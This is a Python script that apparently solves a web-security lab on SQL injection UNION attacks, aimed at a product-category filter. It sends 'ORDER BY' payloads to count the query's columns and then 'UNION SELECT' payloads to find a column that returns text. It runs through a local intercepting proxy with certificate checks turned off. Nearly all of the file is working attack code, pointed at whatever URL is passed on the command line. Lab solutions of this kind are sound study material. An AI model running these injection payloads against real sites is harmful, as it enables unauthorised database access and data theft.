#Problem Statement -> SQL injection UNION attack, finding a column containing text
#Make the database retrieve the string: 'nJTfOj' 

import requests
import sys
import urllib3
from colorama import Fore , Back , Style , init

#Defining colors
#init(autoreset=True)
magenta = Fore.MAGENTA
bright = Style.BRIGHT
reset = Style.RESET_ALL
print(bright,magenta)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def find_cloumn(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        payload = "'+ORDER+BY+{}+--".format(i)
        res = requests.get(url+path+payload,proxies=proxies,verify=False)
        if "Internal Server Error" in res.text:
            return i-1

def find_colmn_withstring_datatype(url,numberof_colmn,text):
    path = "/filter?category=Gifts"
    string=text
    for i in range(1,numberof_colmn+1):
        payload_list=['null']*numberof_colmn 
        payload_list[i-1] = string
        payload="'+union+select+"+",+".join(payload_list)+"+--"
        res = requests.get(url+path+payload,proxies=proxies,verify=False)
        if "Internal Server Error" not in res.text:
            return i
    return False  # in case  it not  able to find column
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        text = sys.argv[2].strip()
    except IndexError:
        print("[+] Usage : python3 {} <url> <string that is asked>".format(sys.argv[0]))
        print("[+] Example : python3 {} www.example.com '2fdf'".format(sys.argv[0]))
        sys.exit(-1)
    
    print("[+] Figuring out number of columns")
    numberof_colmn = find_cloumn(url)
    if numberof_colmn:
        print("There Are {} columns".format(numberof_colmn))
        print("[+] Figuring which column contain text")
        string_column = find_colmn_withstring_datatype(url,numberof_colmn,text)
        if string_column:
            print("Column that contain text is {}".format(string_column))
        else:
            print("unable to find column conatining text")

    else:
        print("Exploit was Unsuccessfulll")


print(reset)